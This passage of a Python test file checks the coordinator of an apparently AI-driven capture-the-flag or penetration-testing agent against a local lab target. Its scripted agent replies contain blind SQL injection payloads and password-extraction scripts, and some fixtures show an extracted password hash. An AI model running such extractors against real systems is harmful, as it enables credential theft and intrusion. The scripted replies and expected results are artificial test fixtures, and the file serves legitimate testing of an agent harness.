            counterfactual_lease=8,
            proof_lease=6,
            max_workers=4,
            repeated_observation_limit=4,
            repeated_low_value_route_limit=4,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.SOLVED
    assert route.model_requests_started == SIX_REQUESTS
    assert len(route.workers) == THREE_REQUESTS
    assert route.workers[1].role is FrontierWorkerRole.PROOF_CLOSURE
    assert route.workers[2].role is FrontierWorkerRole.COUNTERFACTUAL
    assert "closure_paired_secret" in route.workers[2].objective.payload_class
    assert len(executor.calls) == FOUR_REQUESTS
    proof_worker_first_prompt = json.dumps(model.calls[1])
    assert "frontier_target_observation" in proof_worker_first_prompt
    assert "submit" in proof_worker_first_prompt
    focused_prompt = json.dumps(model.calls[3])
    assert "COORDINATOR_CLOSURE_OBLIGATION" in focused_prompt
    assert "paired_secret" in focused_prompt

    active_replays = [json.loads(item) for item in engine.state.signals["sqli_replays"]]
    assert len(active_replays) == 1
    assert active_replays[0]["method"] == "POST"
    assert active_replays[0]["form"]["submit"] == "submit"
    assert engine.state.signals["frontier_superseded_sqli_replays"] == [stale_replay]
    events = engine.workspace.events_path.read_text(encoding="utf-8")
    assert "frontier_request_contract_remembered" in events
    assert "frontier_closure_obligation_opened" in events
    assert events.count("frontier_closure_obligation_handoff_rejected") == 1
    assert events.count("frontier_closure_obligation_worker_handoff") == 1
    assert "frontier_closure_obligation_completed" not in events


def test_specialist_oracle_survives_handoff_and_blocks_run24_inversion(
    tmp_path: Path,
) -> None:
    objective = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:proof_channel",
        expected_signal="extract replayable target proof",
    )
    paired_secret = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:paired_secret",
        expected_signal="extract the paired secret for the known identifier",
    )

    def request(expr: str, body: str, digest: str) -> dict[str, object]:
        return {
            "phase": "boolean_probe",
            "expr": expr,
            "status": 200,
            "body_sha_hint": digest,
            "body_snippet": body,
            "method": "POST",
            "target": {
                "url": f"{TARGET_URL}/index.php",
                "input": "username",
                "method": "POST",
            },
        }

    true_body = '{"response":"password"}'
    false_body = '{"response":"username"}'
    specialist_observation = json.dumps(
        {
            "ok": True,
            "probe": "sqli_exploit",
            "findings": [
                {
                    "type": "sql_boolean_extraction_summary",
                    "extracted": [
                        {
                            "table": "users",
                            "column": "username",
                            "row": 0,
                            "value": "admin",
                        }
                    ],
                    "proofs": [],
                    "login_attempts": [],
                    "auth_bypass_attempts": [],
                }
            ],
            "requests": [
                request("1=1", true_body, "true-digest"),
                request("1=0", false_body, "false-digest"),
                request("2=2", true_body, "true-digest"),
                request("2=1", false_body, "false-digest"),
            ],
        }
    )
    inverted = {
        "action": "run_python",
        "code": (
            "TRUE='{" + '"response":"username"' + "}'\n"
            "FALSE='{" + '"response":"password"' + "}'\n"
            "expr='bounded ascii password extraction'\n"
            "urllib.request.urlopen('http://127.0.0.1:8765/index.php')"
        ),
    }
    corrected = {
        "action": "run_python",
        "code": (
            "TRUE='{" + '"response":"password"' + "}'\n"
            "FALSE='{" + '"response":"username"' + "}'\n"
            "expr='bounded ascii password extraction'\n"
            "urllib.request.urlopen('http://127.0.0.1:8765/index.php')"
        ),
    }
    proof = "flag{verified_oracle_mapping_survived_handoff}"
    model = ScriptedModel(
        [
            FrontierModelReply(
                content=json.dumps({"action": "run_probe", "probe": "sqli_exploit"}),
                cost_usd=0.01,
            ),
            FrontierModelReply(content=json.dumps(inverted), cost_usd=0.02),
            FrontierModelReply(content=json.dumps(corrected), cost_usd=0.03),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation=specialist_observation,
                outcome="confirmed_signal",
                evidence_source_kind="tool_run_probe",
                evidence_observation=specialist_observation,
            ),
            ActionResult(
                ok=True,
                observation=proof,
                stop=True,
                outcome="flag_candidate",
                flag=proof,
                evidence_source_kind="tool_run_python",
                evidence_observation=proof,
            ),
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(objective, paired_secret),
        config=FrontierRouteConfig(
            max_model_requests=THREE_REQUESTS,
            scout_lease=1,
            counterfactual_lease=TWO_REQUESTS,
            proof_lease=THREE_REQUESTS,
            max_workers=THREE_REQUESTS,
            repeated_observation_limit=THREE_REQUESTS,
            repeated_low_value_route_limit=THREE_REQUESTS,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.SOLVED
    assert route.model_requests_started == THREE_REQUESTS
    assert route.spent_cost_usd == pytest.approx(0.06)
    assert len(executor.calls) == TWO_REQUESTS
    assert len(route.workers) == TWO_REQUESTS
    assert route.workers[1].role is FrontierWorkerRole.COUNTERFACTUAL
    oracle_context = json.loads(model.calls[1][-1]["content"])
    oracle_contract = oracle_context["coordinator_memory"]["sql_oracle_contracts"][0]
    correction_prompt = "\n".join(item["content"] for item in model.calls[2])
    assert oracle_contract["true_body"] == true_body
    assert oracle_contract["false_body"] == false_body
    assert oracle_contract["authority"] == "repeated_target_controls"
    assert "COORDINATOR_SQL_ORACLE_GUARD" in correction_prompt
    assert "1=1/2=2" in correction_prompt
    assert "UNION/error" in correction_prompt
    events = engine.workspace.events_path.read_text(encoding="utf-8")
    assert "frontier_sql_oracle_remembered" in events
    assert "frontier_sql_oracle_assignment_rejected" in events
    assert "sql_oracle_assignment_rejected" in events


def test_sql_proof_channel_rejects_handoff_until_bounded_extractor_runs(
    tmp_path: Path,
) -> None:
    objective = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:proof_channel",
        expected_signal=(
            "extract replayable target proof; the default specialist is exhausted; "
            "do not rerun it unchanged"
        ),
        evidence_refs=("primitive:sqli_confirmed:turn:6",),
    )
    one_off = {
        "action": "run_command",
        "command": (
            "curl http://127.0.0.1:8765/index.php --data "
            '"username=x\' OR length(database())>0-- -" # proof response'
        ),
    }
    extractor = {
        "action": "run_python",
        "code": (
            "import urllib.request\n"
            "for pos in range(1, 33):\n"
            '    payload=f"x\' OR ascii(substring((select password),{pos},1))>64-- -"\n'
            "    request=urllib.request.Request("
            "'http://127.0.0.1:8765/index.php', data=('username='+payload).encode())\n"
            "    urllib.request.urlopen(request)\n"
            "    print({'prefix': prefix})\n"
        ),
    }
    proof = "flag{bounded_extractor_proof}"
    model = ScriptedModel(
        [
            FrontierModelReply(content=json.dumps(one_off)),
            FrontierModelReply(content='{"action":"final","summary":"no channel"}'),
            FrontierModelReply(content=json.dumps(extractor)),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation='{"response":"password"}',
                outcome="observed",
                evidence_source_kind="tool_run_command",
                evidence_observation='{"response":"password"}',
            ),
            ActionResult(
                ok=True,
                observation=proof,
                stop=True,
                outcome="flag_candidate",
                flag=proof,
                evidence_source_kind="tool_run_python",
                evidence_observation=proof,
            ),
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(objective,),
        config=FrontierRouteConfig(
            max_model_requests=THREE_REQUESTS,
            scout_lease=THREE_REQUESTS,
            counterfactual_lease=THREE_REQUESTS,
            proof_lease=THREE_REQUESTS,
            max_workers=THREE_REQUESTS,
            repeated_observation_limit=THREE_REQUESTS,
            repeated_low_value_route_limit=THREE_REQUESTS,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.SOLVED
    assert route.model_requests_started == THREE_REQUESTS
    assert len(executor.calls) == TWO_REQUESTS
    assert "bounded extraction program" in json.dumps(model.calls[0]).lower()
    assert "COORDINATOR_BOUNDED_PROOF_WORK_GATE" in json.dumps(model.calls[2])
    events = engine.workspace.events_path.read_text(encoding="utf-8")
    assert "frontier_bounded_proof_work_handoff_rejected" in events


def test_invalid_strict_greater_extractor_is_charged_but_not_executed(
    tmp_path: Path,
) -> None:
    objective = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:proof_channel",
        expected_signal="extract replayable target proof",
    )
    unsafe = {
        "action": "run_python",
        "code": (
            "import urllib.request\n"
            "def char_at(pos):\n"
            "    lo,hi=31,126\n"
            "    while lo<hi:\n"
            "        mid=(lo+hi+1)//2\n"
            "        if oracle(f'ascii(substring((select password),{pos},1))>{mid}'):\n"
            "            lo=mid\n"
            "        else:\n"
            "            hi=mid-1\n"
            "    return chr(lo)\n"
            "for pos in range(1,33):\n"
            "    urllib.request.urlopen('http://127.0.0.1:8765/index.php?username=x')\n"
            "    print(f'PREFIX[{pos}]={prefix}')\n"
        ),
    }
    corrected = {
        "action": "run_python",
        "code": str(unsafe["code"]).replace("return chr(lo)", "return chr(lo+1)"),
    }
    proof = "flag{corrected_extractor_proof}"
    model = ScriptedModel(
        [
            FrontierModelReply(content=json.dumps(unsafe), cost_usd=0.01),
            FrontierModelReply(content=json.dumps(corrected), cost_usd=0.02),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation=proof,
                stop=True,
                outcome="flag_candidate",
                flag=proof,
                evidence_source_kind="tool_run_python",
                evidence_observation=proof,
            )
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(objective,),
        config=FrontierRouteConfig(
            max_model_requests=TWO_REQUESTS,
            scout_lease=TWO_REQUESTS,
            counterfactual_lease=TWO_REQUESTS,
            proof_lease=TWO_REQUESTS,
            max_workers=TWO_REQUESTS,
            repeated_observation_limit=TWO_REQUESTS,
            repeated_low_value_route_limit=TWO_REQUESTS,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.SOLVED
    assert route.model_requests_started == TWO_REQUESTS
    assert route.model_requests_completed == TWO_REQUESTS
    assert route.spent_cost_usd == pytest.approx(0.03)
    assert len(executor.calls) == 1
    assert "COORDINATOR_EXTRACTOR_CORRECTNESS_GATE" in json.dumps(model.calls[1])
    events = engine.workspace.events_path.read_text(encoding="utf-8")
    assert "frontier_extractor_correctness_rejected" in events


def test_uncalibrated_extraction_checkpoint_is_quarantined_without_proof_lease(
    tmp_path: Path,
) -> None:
    objective = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:proof_channel",
        expected_signal="extract replayable target proof",
    )
    extractor = {
        "action": "run_python",
        "code": (
            "import urllib.request\n"
            "def char_at(pos):\n"
            "    lo,hi=31,126\n"
            "    while lo<hi:\n"
            "        mid=(lo+hi+1)//2\n"
            "        if oracle(f'ascii(substring((select password),{pos},1))>{mid}'):\n"
            "            lo=mid\n"
            "        else:\n"
            "            hi=mid-1\n"
            "    return chr(lo+1)\n"
            "for pos in range(1,33):\n"
            "    urllib.request.urlopen('http://127.0.0.1:8765/index.php?username=x')\n"
            "    print(f'PREFIX[{pos}]={prefix}')\n"
        ),
    }
    value = "7d39307ae824e70052c0aa16816a9b16"
    wrapped = json.dumps(
        {
            "command": [
                "docker",
                "run",
                "sh",
                "-lc",
                (
                    "pw=extract_str('select password')\n"
                    "print('EXTRACTED_PASSWORD=',pw)\n"
                    "print('LOGIN_RESPONSE=',body)"
                ),
            ],
            "exit_code": 0,
            "stdout": (
                f"TARGET_LEN=32\nEXTRACTED_PASSWORD={value}\n"
                'LOGIN_RESPONSE={"response":"password"}\n'
            ),
        }
    )
    model = ScriptedModel(
        [
            FrontierModelReply(content=json.dumps(extractor), cost_usd=0.01),
            FrontierModelReply(
                content='{"action":"final","summary":"inspect coordinator memory"}',
                cost_usd=0.02,
            ),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation=wrapped,
                outcome="observed",
                evidence_source_kind="tool_run_python",
                evidence_observation=wrapped,
            )
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(objective,),
        config=FrontierRouteConfig(
            max_model_requests=TWO_REQUESTS,
            scout_lease=TWO_REQUESTS,
            counterfactual_lease=TWO_REQUESTS,
            proof_lease=TWO_REQUESTS,
            max_workers=TWO_REQUESTS,
            repeated_observation_limit=TWO_REQUESTS,
            repeated_low_value_route_limit=TWO_REQUESTS,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.REQUEST_BUDGET_EXHAUSTED
    assert len(route.workers) == 1
    assert len(executor.calls) == 1
    second_prompt = json.dumps(model.calls[1])
    assert "COORDINATOR_EXTRACTION_CHECKPOINT_GUARD" in second_prompt
    assert "1=1 and 2=2" in second_prompt
    assert "1=0 and 2=1" in second_prompt
    assert "frontier_sql_extraction_checkpoints" not in engine.state.signals
    assert "frontier_rejected_credential_replays" not in engine.state.signals
    events = engine.workspace.events_path.read_text(encoding="utf-8")
    assert "frontier_extraction_checkpoint_quarantined" in events
    assert "frontier_extraction_checkpoint_remembered" not in events
    assert "trusted_progress_proof_lease_granted" not in events


def test_natural_prefix_checkpoint_opens_proof_closure_worker(
    tmp_path: Path,
) -> None:
    objective = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:proof_channel",
        expected_signal="extract replayable target proof",
    )
    extractor = {
        "action": "run_python",
        "code": (
            "import urllib.request\n"
            "charset='abcdefghijklmnopqrstuvwxyz'\n"
            "password='aaaaaaaa'\n"
            "prefix=''\n"
            "for pos in range(1,17):\n"
            "    for ch in charset:\n"
            "        candidate=prefix+ch\n"
            """        payload=f"EXISTS(SELECT 1 FROM users WHERE """
            """username LIKE BINARY '{candidate}%')"\n"""
            "        urllib.request.urlopen("
            "'http://127.0.0.1:8765/index.php?username='+payload)\n"
            "        print('PREFIX',prefix)\n"
        ),
    }
    observation = json.dumps(
        {
            "command": ["python3", "print('PREFIX',prefix)"],
            "stdout": (
                'CONTROL_TRUE {"response":"password"}\n'
                'CONTROL_FALSE {"response":"username"}\n'
                "PREFIX a\nPREFIX ad\nPREFIX adm\nPREFIX admi\n"
                "PREFIX admin\nFINAL_PREFIX admin\n"
            ),
        }
    )
    proof = "flag{natural_prefix_proof_closure}"
    model = ScriptedModel(
        [
            FrontierModelReply(content=json.dumps(extractor), cost_usd=0.01),
            FrontierModelReply(content=json.dumps(extractor), cost_usd=0.02),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation=observation,
                outcome="observed",
                evidence_source_kind="tool_run_python",
                evidence_observation=observation,
            ),
            ActionResult(
                ok=True,
                observation=proof,
                stop=True,
                outcome="flag_candidate",
                flag=proof,
                evidence_source_kind="tool_run_python",
                evidence_observation=proof,
            ),
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(objective,),
        config=FrontierRouteConfig(
            max_model_requests=TWO_REQUESTS,
            scout_lease=TWO_REQUESTS,
            counterfactual_lease=TWO_REQUESTS,
            proof_lease=TWO_REQUESTS,
            max_workers=TWO_REQUESTS,
            repeated_observation_limit=TWO_REQUESTS,
            repeated_low_value_route_limit=TWO_REQUESTS,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.SOLVED
    assert len(route.workers) == TWO_REQUESTS
    assert route.workers[1].role is FrontierWorkerRole.PROOF_CLOSURE
    second_prompt = json.dumps(model.calls[1])
    assert "sql_extraction_checkpoints" in second_prompt
    assert "admin" in second_prompt
    checkpoints = engine.state.signals["frontier_sql_extraction_checkpoints"]
    assert len(checkpoints) == 1
    checkpoint = json.loads(checkpoints[0])
    assert checkpoint["candidate_kind"] == "username"
    assert checkpoint["prefix"] == "admin"
    events = engine.workspace.events_path.read_text(encoding="utf-8")
    assert "frontier_extraction_checkpoint_remembered" in events
    assert "trusted_progress_proof_lease_granted" in events


def test_identical_oracle_controls_hold_worker_until_calibrated(
    tmp_path: Path,
) -> None:
    objective = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:proof_channel",
        expected_signal="extract replayable target proof",
    )
    equality_extractor = {
        "action": "run_command",
        "command": (
            "python3 - <<'PY'\n"
            "import urllib.request\n"
            "for pos in range(1,9):\n"
            "    for code in range(32,127):\n"
            "        payload=f'SUBSTRING((SELECT password),{pos},1)={chr(code)}'\n"
            "        urllib.request.urlopen("
            "'http://127.0.0.1:8765/index.php?username='+payload)\n"
            "        print('PREFIX',pos,prefix)\n"
            "PY"
        ),
    }
    invalid_observation = json.dumps(
        {
            "stdout": (
                'CAL T 23 {"response":"password"}\nCAL F 23 {"response":"password"}\nPREFIX 1  \n'
            )
        }
    )
    corrected_observation = json.dumps(
        {
            "stdout": (
                'CAL T 23 {"response":"password"}\nCAL F 23 {"response":"username"}\nPREFIX 1 7\n'
            )
        }
    )
    proof = "flag{calibrated_oracle_proof}"
    model = ScriptedModel(
        [
            FrontierModelReply(content=json.dumps(equality_extractor), cost_usd=0.01),
            FrontierModelReply(
                content='{"action":"final","summary":"uncalibrated"}',
                cost_usd=0.02,
            ),
            FrontierModelReply(content=json.dumps(equality_extractor), cost_usd=0.03),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation=invalid_observation,
                outcome="observed",
                evidence_source_kind="tool_run_command",
                evidence_observation=invalid_observation,
            ),
            ActionResult(
                ok=True,
                observation=corrected_observation,
                stop=True,
                outcome="flag_candidate",
                flag=proof,
                evidence_source_kind="tool_run_command",
                evidence_observation=corrected_observation,
            ),
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(objective,),
        config=FrontierRouteConfig(
            max_model_requests=THREE_REQUESTS,
            scout_lease=THREE_REQUESTS,
            counterfactual_lease=THREE_REQUESTS,
            proof_lease=THREE_REQUESTS,
            max_workers=THREE_REQUESTS,
            repeated_observation_limit=TWO_REQUESTS,
            repeated_low_value_route_limit=TWO_REQUESTS,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.SOLVED
    assert route.model_requests_started == THREE_REQUESTS
    assert route.spent_cost_usd == pytest.approx(0.06)
    assert len(route.workers) == 1
    assert len(executor.calls) == TWO_REQUESTS
    assert "COORDINATOR_ORACLE_CALIBRATION_GATE" in json.dumps(model.calls[1])
    assert "COORDINATOR_ORACLE_CALIBRATION_GATE" in json.dumps(model.calls[2])
    checkpoints = engine.state.signals["frontier_sql_extraction_checkpoints"]
    assert len(checkpoints) == 1
    assert json.loads(checkpoints[0])["prefix"] == "7"
    events = engine.workspace.events_path.read_text(encoding="utf-8")
    assert "frontier_oracle_calibration_rejected" in events
    assert "frontier_oracle_calibration_handoff_rejected" in events
    assert "frontier_oracle_calibration_resolved" in events
    assert "frontier_extraction_checkpoint_remembered" in events
